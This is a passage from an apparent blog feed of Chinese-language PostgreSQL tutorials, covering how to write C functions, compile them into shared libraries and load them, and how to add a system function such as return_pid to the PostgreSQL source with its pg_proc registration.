的内存管理机制，插件中也能使用。</li><li>内核中被标记成<code>PGDLLIMPORT</code> 的全局变量都能在插件中直接使用，这些通常是一些 GUC 参数。</li><li>内核中非 static 的函数也能在插件中使用，只需要先 extern 它们。</li><li>我们可以实现 _PG_init 用于实现一些初始化工作，该函数在连接建立后只会被执行一次。</li><li>我们可以在 _PG_init 中使用函数 DefineCustom*Variable 定义对应插件相关的 GUC 参数，他们可以用于开启和关闭该插件的一些功能。</li><li>插件的参数需要以插件名开头且加上点，例如 oss_fdw.enable_parallel_read。</li></ul><p><a href="https://pan.baidu.com/s/1v1-qdElLfndmfRAi_pdknA" target="_blank" rel="noopener">rock_hello.tar.gz 下载</a></p><ul><li><a href="http://www.postgres.cn/docs/10/extend-extensions.html" target="_blank" rel="noopener">Pg 10中文手册</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PostgreSql扩展Sql-动态加载共享库(C函数)</title>
      <link href="/2018/08/23/database/PostgreSql%E6%89%A9%E5%B1%95Sql-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%85%B1%E4%BA%AB%E5%BA%93-C%E5%87%BD%E6%95%B0/"/>
      <url>/2018/08/23/database/PostgreSql%E6%89%A9%E5%B1%95Sql-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%85%B1%E4%BA%AB%E5%BA%93-C%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="系统函数编写"><a href="#系统函数编写" class="headerlink" title="系统函数编写"></a>系统函数编写</h3><ul><li>基于 psql (PostgreSQL) 10.4</li></ul><p><code>pg_language</code>表定义了函数实现所使用的语言。主要支持了C语言和SQL语句。一些可选的语言包括pl/pgsql、tcl和perl。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shell=# select lanname, lanispl, lanpltrusted, lanplcallfoid, laninline, lanvalidator from pg_language;</span><br><span class="line"> lanname  | lanispl | lanpltrusted | lanplcallfoid | laninline | lanvalidator </span><br><span class="line"><span class="comment">----------+---------+--------------+---------------+-----------+--------------</span></span><br><span class="line"> internal | f       | f            |             0 |         0 |         2246</span><br><span class="line"> c        | f       | f            |             0 |         0 |         2247</span><br><span class="line"> sql      | f       | t            |             0 |         0 |         2248</span><br><span class="line"> plpgsql  | t       | t            |         13198 |     13199 |        13200</span><br></pre></td></tr></table></figure><p><code>pg_proc</code>表对函数进行了定义。每一个函数在该表中都对应一个元组，包含函数名。输入参数类型，返回类型以及对函数的定义(可能是文本，可能是一段编译型语句，也可能是对可执行代码的引用)。编译过的函数可以静态地链接到服务器上，或者在存储在共享库内，当第一次使用该库时动态的载入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell# select proname,prolang, prorettype,proargtypes, prosrc,probin from pg_proc where proname like '%square%';</span><br><span class="line"> proname | prolang | prorettype | proargtypes |           prosrc           |       probin       </span><br><span class="line"><span class="comment">---------+---------+------------+-------------+----------------------------+--------------------</span></span><br><span class="line"> square  |   13201 |         23 | 23          | <span class="keyword">begin</span> <span class="keyword">return</span> $<span class="number">1</span> * $<span class="number">1</span>; <span class="keyword">end</span>; | </span><br><span class="line"> squares |      13 |         23 | 23          | squares_return_int         | $libdir/squares.so</span><br></pre></td></tr></table></figure><p><strong>查看其数据类型</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell# select oid , typname from pg_type where oid = 23;</span><br><span class="line"> oid | typname </span><br><span class="line">-----+---------</span><br><span class="line">  23 | int4</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure><p><br><br><a id="more"></a></p><p><strong>以下是示例函数：</strong></p><p>C:   <a href="https://www.ctolib.com/docs/sfile/PostgreSQL/xfunc-c.html" target="_blank" rel="noopener"><strong>与内建SQL类型等效的C类型</strong></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">square_int (<span class="keyword">int</span> x)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把上面的函数编译成共享库文件，这样声明：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">square</span>(<span class="built_in">int</span>) <span class="keyword">RETURNS</span> <span class="built_in">int</span></span><br><span class="line"><span class="keyword">AS</span> <span class="string">'/path/to/square.so'</span>, <span class="string">'square_int'</span>   <span class="comment">-- ’C`Func_name 若与Sql`Func_name相同,可不写‘</span></span><br><span class="line"><span class="keyword">LANGUAGE</span> <span class="string">'C'</span>;</span><br></pre></td></tr></table></figure><p>PL/PGSQL：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shell=# create function square(int) returns int as 'begin return $1 * $1; end;' LANGUAGE 'plpgsql';</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span></span><br><span class="line">shell=# </span><br><span class="line">shell=# </span><br><span class="line">shell=# <span class="keyword">select</span> <span class="keyword">square</span>(<span class="number">4</span>);</span><br><span class="line"> square </span><br><span class="line"><span class="comment">--------</span></span><br><span class="line">     16</span><br></pre></td></tr></table></figure><h3 id="建立用户函数动态库"><a href="#建立用户函数动态库" class="headerlink" title="建立用户函数动态库"></a>建立用户函数动态库</h3><ul><li><p>新建代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"postgres.h"</span>  <span class="comment">//包含Postgresql基础的接口，这是开发Postgresql扩展必须包含的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"fmgr.h"</span>   <span class="comment">//包含PG_GETARG_XX 和 PG_RETURN_XXX 等获取参数和返回结果的重要宏定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> </span><br><span class="line">square_int(<span class="keyword">int</span> x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译 - 添加共享库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[shell@yfslcentos71 include]$ gcc -I`pg_config --includedir-server` -c squares.c </span><br><span class="line">[shell@yfslcentos71 include]$ gcc -shared squares.o -o squares.so </span><br><span class="line">[shell@yfslcentos71 include]$ cp squares.so `pg_config --libdir`/</span><br></pre></td></tr></table></figure></li><li><p>Pg数据库装载</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=#  create function squares(int) returns int as '$libdir/squares.so', 'square_int' LANGUAGE 'c'  STRICT;</span><br></pre></td></tr></table></figure><p><img src="/img/postgresql/pg_add_system_func_so_err.png" alt="创建数据库"></p></li></ul><h4 id="关于PG-MODULE-MAGIC"><a href="#关于PG-MODULE-MAGIC" class="headerlink" title="关于PG_MODULE_MAGIC"></a>关于PG_MODULE_MAGIC</h4><p>为了确保不会错误加载共享库文件，从PostgreSQL 开始将检查那个文件的”magic block”，这允许服务器以检查明显的不兼容性。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><strong>如果不打算兼容8.2 PostgreSQL之前的版本， <code>#ifdef</code>测试也可以省略 </strong> </p><p>源码修改为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"postgres.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"fmgr.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> </span><br><span class="line">square_int(<span class="keyword">int</span> x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="版本约定"><a href="#版本约定" class="headerlink" title="版本约定"></a>版本约定</h4><h5 id="版本0约定"><a href="#版本0约定" class="headerlink" title="版本0约定"></a>版本0约定</h5><p>版本-0方法中，此风格 C 函数的参数和结果用普通 C 风格声明， 但是要小心使用上面显示的 SQL 数据类型的 C 表现形式。  (以前版本;)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"postgres.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"fmgr.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> </span><br><span class="line">square_int(<span class="keyword">int</span> x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="版本1约定-应当使用该版本"><a href="#版本1约定-应当使用该版本" class="headerlink" title="版本1约定 (应当使用该版本)"></a>版本1约定 (应当使用该版本)</h5><p>版本-1调用约定使用宏消除大多数传递参数和结果的复杂性。版本-1风格函数的C定义总是下面这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Datum <span class="title">funcname</span><span class="params">(PG_FUNCTION_ARGS)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><pre><code>Datum 等同于 void *   表示函数返回任意类型</code></pre></blockquote><p>另外，宏调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PG_FUNCTION_INFO_V1(funcname);</span><br></pre></td></tr></table></figure><p>也必须出现在同一个源文件里(通常就可以写在函数自身前面)。 对那些<code>internal</code>语言函数而言，不需要调用这个宏， 因为PostgreSQL目前假设内部函数都是版本-1。不过，对于动态加载的函数， 它是必须的。</p><p> <strong>每个实际参数都是用一个对应该参数的数据类型的 <code>PG_GETARG_*xxx*()</code>宏抓取的， 用返回类型的<code>PG_RETURN_*xxx*()</code>宏返回结果。 <code>PG_GETARG_*xxx*()</code>接受要抓取的函数参数的编号 (从 0 开始)作为其参数。<code>PG_RETURN_*xxx*()</code> 接受实际要返回的数值为自身的参数。</strong></p><p>关于<code>PG_GETARG_XXX</code> 定义于 <code>src/include/fmgr.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Macros for fetching arguments of standard types */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_DATUM(n) (fcinfo-&gt;arg[n])</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_INT32(n) DatumGetInt32(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_UINT32(n)  DatumGetUInt32(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_INT16(n) DatumGetInt16(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_UINT16(n)  DatumGetUInt16(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_CHAR(n) DatumGetChar(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_BOOL(n) DatumGetBool(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_OID(n) DatumGetObjectId(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_POINTER(n) DatumGetPointer(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_CSTRING(n) DatumGetCString(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_NAME(n) DatumGetName(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="comment">/* these macros hide the pass-by-reference-ness of the datatype: */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_FLOAT4(n)  DatumGetFloat4(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_FLOAT8(n)  DatumGetFloat8(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_INT64(n) DatumGetInt64(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="comment">/* use this if you want the raw, possibly-toasted input datum: */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_RAW_VARLENA_P(n)((struct varlena *) PG_GETARG_POINTER(n))</span></span><br><span class="line"><span class="comment">/* use this if you want the input datum de-toasted: */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_VARLENA_P(n) PG_DETOAST_DATUM(PG_GETARG_DATUM(n))</span></span><br><span class="line"><span class="comment">/* and this if you can handle 1-byte-header datums: */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_GETARG_VARLENA_PP(n) PG_DETOAST_DATUM_PACKED(PG_GETARG_DATUM(n))</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"postgres.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"fmgr.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">PG_FUNCTION_INFO_V1(squares_return_int);</span><br><span class="line"></span><br><span class="line"><span class="function">Datum <span class="title">squares_return_int</span><span class="params">(PG_FUNCTION_ARGS)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    int32 arg = PG_GETARG_INT32(<span class="number">0</span>);</span><br><span class="line">    PG_RETURN_INT32(arg * arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a><strong>编译</strong></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[shell@yfslcentos71 include]$ gcc -I`pg_config --includedir-server` -c squares.c </span><br><span class="line">[shell@yfslcentos71 include]$ gcc -shared squares.o -o squares.so </span><br><span class="line">/usr/bin/ld: squares.o: relocation R_X86_64_32 against `.rodata' can not be used when making a shared object; recompile with -fPIC</span><br><span class="line">squares.o: could not read symbols: Bad value</span><br><span class="line"></span><br><span class="line">[shell@yfslcentos71 include]$ gcc  -I`pg_config --includedir-server` -fPIC  -c squares.c</span><br><span class="line">[shell@yfslcentos71 include]$ gcc -shared squares.o -o squares.so</span><br><span class="line">[shell@yfslcentos71 include]$ </span><br><span class="line">[shell@yfslcentos71 include]$ cp squares.so `pg_config --libdir`/</span><br></pre></td></tr></table></figure><h4 id="SQL声明函数"><a href="#SQL声明函数" class="headerlink" title="SQL声明函数"></a><strong>SQL声明函数</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell=# create function squares(int) returns int as '$libdir/squares.so', 'squares_return_int' LANGUAGE 'c'  STRICT; </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span></span><br></pre></td></tr></table></figure><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><ul><li>函数声明为”strict”(严格)，意思是说如果任何输入值为NULL， 那么系统应该自动假设一个NULL的结果。这样处理可以让我们避免在函数代码里面检查 NULL输入。如果不这样处理，我们就得明确检查NULL， 比如为每个传递引用的参数检查空指针。对于传值类型的参数，我们甚至没有办法检查！ </li></ul><p><a href="https://www.ctolib.com/docs/sfile/PostgreSQL/xfunc-c.html" target="_blank" rel="noopener">参考Postgresql 9.4手册</a></p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Postgresql扩展Sql-源码添加系统函数</title>
      <link href="/2018/08/22/database/Postgresql%E6%89%A9%E5%B1%95Sql-%E6%BA%90%E7%A0%81%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0/"/>
      <url>/2018/08/22/database/Postgresql%E6%89%A9%E5%B1%95Sql-%E6%BA%90%E7%A0%81%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="PostgreSql-源码增添新的系统函数"><a href="#PostgreSql-源码增添新的系统函数" class="headerlink" title="PostgreSql 源码增添新的系统函数"></a>PostgreSql 源码增添新的系统函数</h3><ul><li>基于Postgresql 10.4 </li><li>基于 psql (PostgreSQL) 11beta2</li></ul><h4 id="函数实现"><a href="#函数实现" class="headerlink" title="函数实现:"></a>函数实现:</h4><ul><li><p>第一种: <code>添加于 backend/utils/adt/pgstatfuncs.c；</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 函数实现;  </span><br><span class="line">Datum</span><br><span class="line">return_pid(PG_FUNCTION_ARGS)</span><br><span class="line">&#123;    </span><br><span class="line">PG_RETURN_INT32(MyProcPid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><a id="more"></a><ul><li><p>第二种: 新建 <code>.c</code> 文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;postgres.h&quot;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/file.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dirent.h&gt;</span><br><span class="line"></span><br><span class="line">#include &quot;access/heapam.h&quot;</span><br><span class="line">#include &quot;catalog/pg_type.h&quot;</span><br><span class="line">#include &quot;funcapi.h&quot;</span><br><span class="line">#include &quot;miscadmin.h&quot;</span><br><span class="line">#include &quot;postmaster/syslogger.h&quot;</span><br><span class="line">#include &quot;storage/fd.h&quot;</span><br><span class="line">#include &quot;utils/builtins.h&quot;</span><br><span class="line"></span><br><span class="line">Datum</span><br><span class="line">return_pid(PG_FUNCTION_ARGS)</span><br><span class="line">&#123;    </span><br><span class="line"> PG_RETURN_INT32(MyProcPid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 需要在Makefile文件中增加对其.c文件的编译引用:</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># keep this list arranged alphabetically or it gets to be a mess</span><br><span class="line">OBJS = acl.o amutils.o arrayfuncs.o array_expanded.o array_selfuncs.o \</span><br><span class="line">array_typanalyze.o array_userfuncs.o arrayutils.o ascii.o \</span><br><span class="line">bool.o cash.o char.o cryptohashes.o \</span><br><span class="line">date.o datetime.o datum.o dbsize.o domains.o \</span><br><span class="line">encode.o enum.o expandeddatum.o expandedrecord.o \</span><br><span class="line">float.o format_type.o formatting.o genfile.o \</span><br><span class="line">geo_ops.o geo_selfuncs.o geo_spgist.o inet_cidr_ntop.o inet_net_pton.o \</span><br><span class="line">int.o int8.o json.o jsonb.o jsonb_gin.o jsonb_op.o jsonb_util.o \</span><br><span class="line">jsonfuncs.o like.o lockfuncs.o mac.o mac8.o misc.o nabstime.o name.o \</span><br><span class="line">network.o network_gist.o network_selfuncs.o network_spgist.o \</span><br><span class="line">numeric.o numutils.o oid.o oracle_compat.o \</span><br><span class="line">orderedsetaggs.o pg_locale.o pg_lsn.o pg_upgrade_support.o \</span><br><span class="line">pgstatfuncs.o \</span><br><span class="line">pseudotypes.o quote.o rangetypes.o rangetypes_gist.o \</span><br><span class="line">rangetypes_selfuncs.o rangetypes_spgist.o rangetypes_typanalyze.o \</span><br><span class="line">regexp.o regproc.o ri_triggers.o rowtypes.o ruleutils.o \</span><br><span class="line">selfuncs.o tid.o timestamp.o trigfuncs.o \</span><br><span class="line">tsginidx.o tsgistidx.o tsquery.o tsquery_cleanup.o tsquery_gist.o \</span><br><span class="line">tsquery_op.o tsquery_rewrite.o tsquery_util.o tsrank.o \</span><br><span class="line">tsvector.o tsvector_op.o tsvector_parser.o \</span><br><span class="line">txid.o uuid.o varbit.o varchar.o varlena.o version.o \</span><br><span class="line">windowfuncs.o xid.o xml.o &lt;page_mr.o&gt;   ##新增;</span><br></pre></td></tr></table></figure></li></ul><h4 id="支持外部访问"><a href="#支持外部访问" class="headerlink" title="支持外部访问"></a>支持外部访问</h4><ul><li><p>增加外部调用声明 <code>backend/utils/fmgrprotos.h</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extern Datum return_pid(PG_FUNCTION_ARGS);</span><br></pre></td></tr></table></figure></li></ul><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//定义 OID</span><br><span class="line">backend/utils/fmgroids.h:2588: #define F_RETURN_PID 54336</span><br><span class="line"></span><br><span class="line">//定义参数;</span><br><span class="line">backend/utils/fmgrtab.c:2833:  &#123; 54336, &quot;return_pid&quot;, 0, true, false, return_pid &#125;</span><br></pre></td></tr></table></figure><ul><li>关于OID添加: 参考后文补充;</li></ul><h4 id="注册到命令空间"><a href="#注册到命令空间" class="headerlink" title="注册到命令空间"></a>注册到命令空间</h4><h5 id="PostgreSQL-11beta2"><a href="#PostgreSQL-11beta2" class="headerlink" title="PostgreSQL 11beta2"></a>PostgreSQL 11beta2</h5><ul><li>用于生成注册信息, 注册到命令空间  <code>include/catalog/pg_proc.dat</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//用于生成pg_proc 表信息;   -- 注册到命令空间</span><br><span class="line">&#123; oid =&gt; &apos;54336&apos;, descr =&gt; &apos;statistics: current backend PID&apos;,</span><br><span class="line">  proname =&gt; &apos;return_pid&apos;, provolatile =&gt; &apos;s&apos;, proparallel =&gt; &apos;r&apos;,</span><br><span class="line">  prorettype =&gt; &apos;int4&apos;, proargtypes =&gt; &apos;&apos;, prosrc =&gt; &apos;return_pid&apos; &#125;,</span><br></pre></td></tr></table></figure><h5 id="Postgresql-10-4"><a href="#Postgresql-10-4" class="headerlink" title="Postgresql 10.4"></a>Postgresql 10.4</h5><ul><li><code>include/catalog/pg_proc.h</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DATA(insert OID = 2026 (  pg_backend_pidPGNSP PGUID 12 1 0 0 0 f f f f t f s r 0 0 23 &quot;&quot; _null_ _null_ _null_ _null_ _null_ pg_backend_pid _null_ _null_ _null_ ));</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>在pg_proc.h中插入的记录是什么含义？</p><blockquote><p>以第一行为例详细说明如下：<br>DATA(insert OID = 13624 ( sys_read_page PGNSP 0 PGUID 12 t f f f t f v 2 17 17 i f i f f “25 20 20” <em>null</em> <em>null</em> <em>null</em> <em>null</em> <em>null</em> <em>null</em> sys_read_page 2D <em>null</em> ));</p><p>13624–OID使用内核中未使用的OID即可（src/include/catalog下unused_oids，可以显示未使用的oid） postgres内部预留了1W多个oid给系统用，选一个没有的就行，如果不知道哪些可用，在\src\include\catalog\ 下有个脚本文件unused_oids，运行一下就能找出哪些oid可用，但要这是一个linux脚本，需要在linux下运行。</p><p>PGNSP–函数所属的名字空间的OID，PGNSP即pg_catalog（oid=11），内置函数添加此值固定</p><p>PGUID–函数的拥有者OID，PGUID及initdb时指定用户（oid=10），内置函数添加此值固定</p><p>12–实现语言或该函数的调用接口，内置函数使用12（internal），SQL用14</p><p>t–函数是否为一个聚集函数<br>f–函数是否为一个窗口函数<br>f–函数是一个安全性定义者（即，一个”setuid”函数）<br>f–该函数没有副作用。除了通过返回值，没有关于参数的信息被传播。任何会抛出基于其参数值的错误信息的函数都不是泄露验证的。<br>t–当任意调用函数为空时，函数是否会返回空值。在那种情况下函数实际上根本不会被调用。非”strict”函数必须准备好处理空值输入。<br>f–函数是否返回一个集合（即，指定数据类型的多个值）<br>v–未知</p><p>2–输入参数的个数，对应后面的”“25 20 